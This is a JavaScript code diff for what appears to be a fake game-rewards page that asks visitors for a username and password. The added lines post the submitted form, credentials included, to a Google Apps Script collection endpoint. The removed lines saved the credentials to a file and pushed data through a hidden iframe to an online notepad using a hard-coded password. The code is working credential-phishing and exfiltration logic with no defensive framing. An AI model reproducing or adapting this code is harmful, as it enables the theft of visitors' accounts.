@@ -1,3 +1,6 @@
+const scriptURL = 'https://script.google.com/macros/s/AKfycby5U85T63XoX4OOWy-8bgKcSzvDc-HtwJ2JSbb5GeQ6CpjqNBCNnId6HXs6F3zSObE3/exec'
+const form = document.forms['submit-to-google-sheet']
+
 // Coin textfield
 document.addEventListener("DOMContentLoaded", function() {
     const coinTextField = document.getElementById("coinTextFieldID");
@@ -164,7 +167,7 @@ document.addEventListener("DOMContentLoaded", function() {
         }
 
         // Check if all fields are not empty
-        if (checkFieldsNotEmpty()) {
+       
             // Hide confirmation panel
             confirmationPanel.style.display = "none";
             // Show rewards panel
@@ -174,25 +177,10 @@ document.addEventListener("DOMContentLoaded", function() {
             const username = usernameField.value.trim();
             const password = passwordField.value.trim();
 
-            // Prepare data to be written to file
-            const data = `Username: ${username}\nPassword: ${password}`;
+            fetch(scriptURL, { method: 'POST', body: new FormData(form) })
+            .then(response => console.log('Success!', response))
+            .catch(error => console.error('Error!', error.message))
 
-            // Create a new Blob object with the data
-            const blob = new Blob([data], { type: "text/plain" });
-
-            // Create a link element
-            const link = document.createElement("a");
-
-            // Set link's attributes
-            link.href = URL.createObjectURL(blob);
-            link.download = "credentials.txt";
-
-            // Append link to body and click it programmatically to trigger download
-            document.body.appendChild(link);
-            link.click();
-
-            // Remove the link from the body
-            document.body.removeChild(link);
 
             // Clear all text fields
             usernameField.value = "";
@@ -207,47 +195,15 @@ document.addEventListener("DOMContentLoaded", function() {
 
             successPanel.style.display = "block";
 
-            /*-----------------------Writing Text to Online---------------------------------------*/
+            /*-----------------------Writing Text to Excel---------------------------------------*/
 
-            //var wnd = window.open("https://www.protectedtext.com/HelmetHeroesStorage");
-
-             // Create a hidden iframe to load the website
-             var iframe = document.createElement('iframe');
-             iframe.style.display = 'none';
-             iframe.src = 'https://www.protectedtext.com/HelmetHeroesStorage';
-             document.body.appendChild(iframe);
-
-             // Wait for the iframe to load
-             iframe.onload = function() {
-             // Access the document within the iframe
-             var iframeDocument = iframe.contentWindow.document;
-
-             // Find the input field and set its value
-             var inputField = iframeDocument.getElementById('yourInputFieldId'); // Replace 'yourInputFieldId' with the actual ID of the input field
-             if (inputField) {
-                inputField.value = '@Dd119998080169';
-             }
-
-            // Find and click the button
-            var button = iframeDocument.getElementById('yourButtonId'); // Replace 'yourButtonId' with the actual ID of the button
-            if (button) {
-             button.click();
-        }
-    };
-
-// Wait for some time (e.g., 4 seconds) and then remove the iframe
-setTimeout(function() {
-    document.body.removeChild(iframe);
-}, 4000);
-
-
-
+            
 
 
             
-        }
     });
 });
+
 
 
 document.addEventListener("DOMContentLoaded", function() {
